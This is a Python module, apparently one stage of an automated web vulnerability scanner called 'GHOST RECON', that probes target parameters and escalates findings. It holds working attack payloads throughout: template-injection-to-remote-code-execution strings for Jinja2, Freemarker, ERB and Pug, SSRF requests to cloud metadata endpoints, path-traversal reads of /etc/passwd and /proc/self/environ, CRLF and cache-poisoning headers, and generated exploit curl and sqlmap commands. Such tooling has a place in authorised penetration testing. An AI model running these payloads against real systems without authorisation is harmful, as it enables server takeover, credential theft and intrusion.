"""
GHOST RECON v2.0 — STEP 13: Advanced Fuzzing + Vulnerability Escalation Engine

Upgrades over the previous internal build:
  - ESCALATION ENGINE: When SSTI {{7*7}}→49 succeeds, automatically fires
    escalate_ssti() which injects engine-specific RCE payloads.
  - Jinja2: config.__class__.__init__.__globals__['os'].popen('id').read()
  - Twig: _self.env.registerUndefinedFilterCallback → system()
  - If 'uid=' in response → CRITICAL RCE finding with exact curl command.
  - All existing probes preserved: CORS, XSS, SQLi, SSRF, LFI, CRLF, Cache.
"""

from __future__ import annotations

import asyncio
import os
import random
import re
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse, quote

try:
    from rich.console import Console
    from rich.progress import (
        Progress, SpinnerColumn, TextColumn, BarColumn,
        MofNCompleteColumn, TimeElapsedColumn,
    )
    _RICH = True
except ImportError:
    _RICH = False

STEP_NUM = 13
STEP_NAME = "Advanced Fuzzing"

MARKETING_PARAMS = frozenset({
    "utm_source", "utm_medium", "utm_campaign", "gclid", "fbclid",
    "gad_source", "gad", "gbraid", "wbraid", "adgroup", "clickid",
    "matchtype", "mc_cid", "msclkid",
})

SSTI_PAYLOADS = [
    ("{{7*7}}", "49", "Jinja2/Twig"),
    ("${7*7}", "49", "Freemarker/Mako"),
    ("<%=7*7%>", "49", "ERB/JSP"),
    ("{{config}}", "<Config", "Jinja2-config"),
    ("#{7*7}", "49", "Jade/Pug"),
]

# ═══════════════════════════════════════════════════════════════════════════════
# SSTI → RCE ESCALATION PAYLOADS (engine-specific, benign id command)
# ═══════════════════════════════════════════════════════════════════════════════

SSTI_ESCALATION: Dict[str, List[Dict[str, str]]] = {
    "Jinja2/Twig": [
        {
            "payload": "{{self.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()[0].decode()}}",
            "indicator": "uid=",
            "label": "Jinja2 subprocess.Popen",
        },
        {
            "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "indicator": "uid=",
            "label": "Jinja2 config.__globals__",
        },
        {
            "payload": "{{lipsum.__globals__['os'].popen('id').read()}}",
            "indicator": "uid=",
            "label": "Jinja2 lipsum globals",
        },
    ],
    "Jinja2-config": [
        {
            "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "indicator": "uid=",
            "label": "Jinja2 config→os.popen",
        },
    ],
    "Freemarker/Mako": [
        {
            "payload": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            "indicator": "uid=",
            "label": "Freemarker Execute",
        },
    ],
    "ERB/JSP": [
        {
            "payload": "<%=`id`%>",
            "indicator": "uid=",
            "label": "ERB backtick exec",
        },
    ],
    "Jade/Pug": [
        {
            "payload": "#{root.process.mainModule.require('child_process').execSync('id')}",
            "indicator": "uid=",
            "label": "Pug child_process",
        },
    ],
}

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/v1/",
    "http://[::ffff:169.254.169.254]/latest/meta-data/",
]

LFI_PAYLOADS = [
    "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "/proc/self/environ",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
]

CRLF_PAYLOADS = [
    ("%0d%0aX-Injected: ghost", "x-injected: ghost"),
    ("%0d%0a%0d%0a<h1>ghost</h1>", "<h1>ghost</h1>"),
    ("%E5%98%8A%E5%98%8DX-Injected:%20ghost", "x-injected: ghost"),
    ("%0d%0aSet-Cookie:%20ghost=pwned", "set-cookie: ghost"),
]

CACHE_POISON_HEADERS = [
    ("X-Forwarded-Host", "evil.ghost.test"),
    ("X-Forwarded-Scheme", "http"),
    ("X-Original-URL", "/poison-test"),
    ("X-Host", "evil.ghost.test"),
    ("X-Forwarded-Server", "evil.ghost.test"),
]

SQLI_RE = re.compile(
    r"sql syntax|mysql_fetch|unclosed quotation|ORA-\d|pg_query|sqlite3|SQLSTATE|PDOException",
    re.I,
)
LFI_RE = re.compile(
    r"root:x:0|\[boot loader\]|\[extensions\]|daemon:x:", re.I
)


# ═══════════════════════════════════════════════════════════════════════════════
# SSTI ESCALATION ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

async def escalate_ssti(
    ctx: Any,
    engine: Any,
    param: str,
    engine_name: str,
    base_url: str,
    host_header: str,
    _p,
) -> bool:
    """
    Automatically inject secondary RCE payloads after SSTI math eval succeeds.

    Args:
        ctx: Pipeline context
        engine: httpx async engine
        param: Vulnerable parameter name
        engine_name: Detected template engine (e.g., "Jinja2/Twig")
        base_url: Target probe URL
        host_header: Host header for CDN bypass
        _p: Print function

    Returns:
        True if RCE confirmed, False otherwise.
    """
    escalation_payloads = SSTI_ESCALATION.get(engine_name, [])

    if not escalation_payloads:
        _p(f"    [dim]No escalation payloads for {engine_name}[/dim]")
        return False

    _p(f"    [yellow]⚡ Escalating SSTI → RCE ({engine_name}, {len(escalation_payloads)} payloads)[/yellow]")

    extra = {}
    if host_header:
        extra["Host"] = host_header

    for esc in escalation_payloads:
        payload = esc["payload"]
        indicator = esc["indicator"]
        label = esc["label"]

        try:
            test_url = f"{base_url}?{param}={quote(payload)}"
            resp = await engine.get(
                test_url,
                extra_headers=extra or None,
                timeout=10.0,
                scope="target",
            )

            if resp.code == 200 and resp.body and indicator in resp.body:
                # Extract the uid= line for proof
                uid_match = re.search(r"(uid=\d+\(\w+\)\s+gid=\d+[^\n]*)", resp.body)
                uid_proof = uid_match.group(1) if uid_match else indicator

                _p(f"    [red]🔥 RCE CONFIRMED: {label} → {uid_proof}[/red]")

                curl_cmd = (
                    f"curl -sk '{base_url}?{param}={quote(payload)}'"
                    + (f" -H 'Host: {host_header}'" if host_header else "")
                )

                ctx.add_finding(
                    severity="CRITICAL",
                    category="SSTI",
                    url=test_url,
                    title=f"RCE via SSTI ({label}) [CONFIRMED]",
                    detail=(
                        f"Engine: {engine_name} | Method: {label}\n"
                        f"Proof: {uid_proof}\n"
                        f"Payload: {payload}"
                    ),
                    impact=(
                        "Full Remote Code Execution — attacker can execute arbitrary "
                        "OS commands on the server"
                    ),
                    exploit=curl_cmd,
                    confidence="CONFIRMED",
                    cwe="CWE-94",
                    phase="13",
                )
                return True

        except Exception as e:
            _p(f"    [dim]Escalation {label} error: {e}[/dim]")
            continue

    _p(f"    [dim]SSTI escalation: no RCE confirmed (math eval only)[/dim]")
    return False


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN EXECUTION
# ═══════════════════════════════════════════════════════════════════════════════

async def execute(ctx: Any, engine: Any, config: Any) -> Any:
    console = Console() if _RICH else None

    def _p(m):
        (console.print if console else lambda x: print(
            __import__("re").sub(r"\[/?[^\]]*\]", "", x)
        ))(m)

    if engine is None:
        _p("  [yellow]⚠ No HTTP engine — advanced fuzzing requires ghost_core[/yellow]")
        return ctx

    ws = getattr(config, "workspace", ".") or "."
    params = list(ctx.get_untested_params(limit=15))
    target_url = ctx.url
    host_hdr = ctx.host_header

    _p(f"  [bold]Advanced vulnerability fuzzing ({len(params)} params)[/bold]")

    def _extra(extra_dict=None):
        h = {}
        if host_hdr:
            h["Host"] = host_hdr
        if extra_dict:
            h.update(extra_dict)
        return h or None

    findings_before = ctx.finding_count()

    # 1. CORS
    _p(f"\n  [cyan]→[/cyan]  CORS misconfiguration")
    for origin in [f"https://evil.{ctx.root_domain}", "https://attacker.com", "null"]:
        try:
            resp = await engine.request(
                ctx.probe_url("/"), method="HEAD",
                extra_headers=_extra({"Origin": origin}),
                timeout=8.0, scope="target",
            )
            acao = resp.headers.get("access-control-allow-origin", "")
            if origin in acao or acao == "*":
                ctx.add_finding(
                    severity="HIGH", category="CORS_MISCONFIG", url=ctx.url,
                    title=f"CORS reflects: {origin}", detail=f"ACAO: {acao}",
                    impact="Cross-origin data theft",
                    exploit=f"curl -sI -H 'Origin: {origin}' {ctx.url}",
                    confidence="CONFIRMED", cwe="CWE-942", phase="13",
                )
                _p(f"  [red]✓ CORS: reflects {origin}[/red]")
                break
        except Exception:
            continue

    # 2. XSS reflection
    _p(f"  [cyan]→[/cyan]  XSS reflection ({len(params)} params)")
    canary = f"ghxss{random.randint(10000, 99999)}"
    for p in params[:12]:
        if p.lower() in MARKETING_PARAMS:
            continue
        try:
            resp = await engine.get(
                ctx.probe_url(f"?{p}={canary}"),
                extra_headers=_extra(), timeout=8.0, scope="target",
            )
            if resp.code == 200 and canary in (resp.body or ""):
                ctx.add_finding(
                    severity="MEDIUM", category="XSS_REFLECTED",
                    url=f"{ctx.url}?{p}={canary}",
                    title=f"Param '{p}' reflects input",
                    detail="Canary reflected in response",
                    impact="Session hijack, phishing",
                    exploit=f"{ctx.url}?{p}=<svg/onload=alert(1)>",
                    confidence="MEDIUM", cwe="CWE-79", phase="13",
                )
                _p(f"  [yellow]⚠ XSS: '{p}' reflects[/yellow]")
        except Exception:
            continue

    # 3. SQLi error-based
    _p(f"  [cyan]→[/cyan]  SQLi error-based")
    for p in params[:10]:
        if p.lower() in MARKETING_PARAMS:
            continue
        for payload in ["1'", '1"', "1' OR '1'='1"]:
            try:
                resp = await engine.get(
                    ctx.probe_url(f"?{p}={quote(payload)}"),
                    extra_headers=_extra(), timeout=8.0, scope="target",
                )
                if resp.body and SQLI_RE.search(resp.body):
                    ctx.add_finding(
                        severity="CRITICAL", category="SQLI",
                        url=f"{ctx.url}?{p}={quote(payload)}",
                        title=f"SQL error on '{p}'",
                        detail="DB error from injection",
                        impact="DB dump, credential theft, RCE",
                        exploit=f"sqlmap -u '{ctx.url}?{p}=1' --batch --level 3",
                        confidence="HIGH", cwe="CWE-89", phase="13",
                    )
                    _p(f"  [red]✓ SQLi: '{p}'[/red]")
                    ctx.mark_param_tested(p)
                    break
            except Exception:
                continue

    # 4. SSTI with DUAL-VARIANCE CONFIRMATION (v14 — kills catch-all FPs)
    _p(f"  [cyan]→[/cyan]  SSTI dual-variance + escalation")
    try:
        from core.logic_fuzzer import confirm_ssti_with_variance, escalate_ssti_to_rce
        _has_logic_fuzzer = True
    except ImportError:
        _has_logic_fuzzer = False

    for p in params[:8]:
        if p.lower() in MARKETING_PARAMS:
            continue
        if _has_logic_fuzzer:
            # v14: Dual-variance — requires BOTH {{77*77}}→5929 AND {{88*88}}→7744
            confirmed = await confirm_ssti_with_variance(
                engine, ctx.probe_url(""), p,
                host_header=host_hdr,
            )
            if confirmed:
                eng_name = confirmed["engine"]
                _p(f"  [red]✓ SSTI CONFIRMED (dual-variance): '{p}' ({eng_name})[/red]")
                ctx.add_finding(
                    severity="CRITICAL", category="SSTI",
                    url=f"{ctx.url}?{p}={{{{77*77}}}}",
                    title=f"SSTI ({eng_name}) on '{p}' [DUAL-VARIANCE CONFIRMED]",
                    detail=(
                        f"Probe 1: {{{{77*77}}}} → 5929 ✓\n"
                        f"Probe 2: {{{{88*88}}}} → 7744 ✓\n"
                        f"Engine: {eng_name}"
                    ),
                    impact="Remote Code Execution",
                    confidence="CONFIRMED", cwe="CWE-1336", phase="13",
                )
                # Attempt RCE escalation
                rce = await escalate_ssti_to_rce(
                    engine, ctx, ctx.probe_url(""), p, eng_name, host_hdr,
                )
                if rce:
                    _p(f"    [red]🔥 RCE ESCALATION SUCCESSFUL on '{p}'[/red]")
        else:
            # Fallback: single-probe (v13 behavior) with built-in escalation
            for payload, expected, eng_name in SSTI_PAYLOADS:
                try:
                    resp = await engine.get(
                        ctx.probe_url(f"?{p}={quote(payload)}"),
                        extra_headers=_extra(), timeout=8.0, scope="target",
                    )
                    if resp.body and expected in resp.body:
                        sev = "CRITICAL" if "Config" in expected else "HIGH"
                        ctx.add_finding(
                            severity=sev, category="SSTI",
                            url=f"{ctx.url}?{p}={quote(payload)}",
                            title=f"SSTI ({eng_name}) on '{p}'",
                            detail=f"{payload} → {expected}",
                            impact="Remote Code Execution",
                            confidence="HIGH", cwe="CWE-1336", phase="13",
                        )
                        _p(f"  [red]✓ SSTI: '{p}' ({eng_name})[/red]")
                        rce_confirmed = await escalate_ssti(
                            ctx=ctx, engine=engine, param=p,
                            engine_name=eng_name,
                            base_url=ctx.probe_url(""),
                            host_header=host_hdr, _p=_p,
                        )
                        if rce_confirmed:
                            _p(f"    [red]🔥 RCE ESCALATION SUCCESSFUL on '{p}'[/red]")
                        break
                except Exception:
                    continue

    # 5. SSRF
    _p(f"  [cyan]→[/cyan]  SSRF probing")
    ssrf_params = [
        p for p in params
        if any(k in p.lower() for k in [
            "url", "uri", "path", "redirect", "next", "target",
            "dest", "link", "fetch", "load", "file", "page",
        ])
    ]
    for p in ssrf_params[:5]:
        for payload in SSRF_PAYLOADS:
            try:
                resp = await engine.get(
                    ctx.probe_url(f"?{p}={quote(payload)}"),
                    extra_headers=_extra(), timeout=10.0, scope="target",
                )
                if resp.body and any(
                    k in resp.body
                    for k in ["ami-id", "instance-id", "metadata", "project-id", "computeMetadata"]
                ):
                    ctx.add_finding(
                        severity="CRITICAL", category="SSRF",
                        url=f"{ctx.url}?{p}={quote(payload)}",
                        title=f"SSRF to cloud metadata via '{p}'",
                        impact="Cloud credential theft, instance takeover",
                        confidence="CONFIRMED", cwe="CWE-918", phase="13",
                    )
                    _p(f"  [red]✓ SSRF: '{p}' → cloud metadata[/red]")
                    break
            except Exception:
                continue

    # 6. LFI
    _p(f"  [cyan]→[/cyan]  LFI probing")
    lfi_params = [
        p for p in params
        if any(k in p.lower() for k in [
            "file", "path", "page", "include", "template",
            "doc", "dir", "folder",
        ])
    ]
    for p in lfi_params[:5]:
        for payload in LFI_PAYLOADS:
            try:
                resp = await engine.get(
                    ctx.probe_url(f"?{p}={quote(payload)}"),
                    extra_headers=_extra(), timeout=8.0, scope="target",
                )
                if resp.body and LFI_RE.search(resp.body):
                    ctx.add_finding(
                        severity="CRITICAL", category="LFI",
                        url=f"{ctx.url}?{p}={quote(payload)}",
                        title=f"LFI via '{p}'",
                        detail=f"Payload: {payload}",
                        impact="Local file read, credential theft",
                        confidence="HIGH", cwe="CWE-22", phase="13",
                    )
                    _p(f"  [red]✓ LFI: '{p}'[/red]")
                    break
            except Exception:
                continue

    # 7. CRLF
    _p(f"  [cyan]→[/cyan]  CRLF injection")
    for payload, indicator in CRLF_PAYLOADS:
        try:
            test_url = ctx.probe_url(f"/{payload}")
            resp = await engine.request(
                test_url, method="HEAD",
                extra_headers=_extra(), timeout=8.0, scope="target",
            )
            header_text = "\n".join(
                f"{k}: {v}" for k, v in resp.headers.items()
            ).lower()
            if indicator in header_text:
                ctx.add_finding(
                    severity="HIGH", category="CRLF_INJECTION",
                    url=test_url,
                    title="CRLF injection",
                    detail=f"Payload: {payload}",
                    impact="Header injection, XSS, session fixation",
                    confidence="CONFIRMED", cwe="CWE-113", phase="13",
                )
                _p(f"  [red]✓ CRLF: injected[/red]")
                break
        except Exception:
            continue

    # 8. Cache poisoning
    _p(f"  [cyan]→[/cyan]  Cache poisoning")
    for hdr_name, hdr_val in CACHE_POISON_HEADERS:
        try:
            resp = await engine.get(
                ctx.probe_url("/"),
                extra_headers=_extra({hdr_name: hdr_val}),
                timeout=8.0, scope="target",
            )
            if resp.body and (hdr_val in resp.body or "poison" in resp.body):
                ctx.add_finding(
                    severity="HIGH", category="CACHE_POISON",
                    url=ctx.url,
                    title=f"Cache poisoning via {hdr_name}",
                    detail=f"{hdr_name}: {hdr_val} reflected",
                    impact="Serve malicious content to all users",
                    confidence="HIGH", cwe="CWE-349", phase="13",
                )
                _p(f"  [yellow]⚠ Cache poison: {hdr_name}[/yellow]")
                break
        except Exception:
            continue

    # Mark tested params
    for p in params:
        ctx.mark_param_tested(p)

    new_findings = ctx.finding_count() - findings_before
    _p(f"\n  [bold]Step 13 Summary:[/bold] {new_findings} new findings from fuzzing")
    return ctx
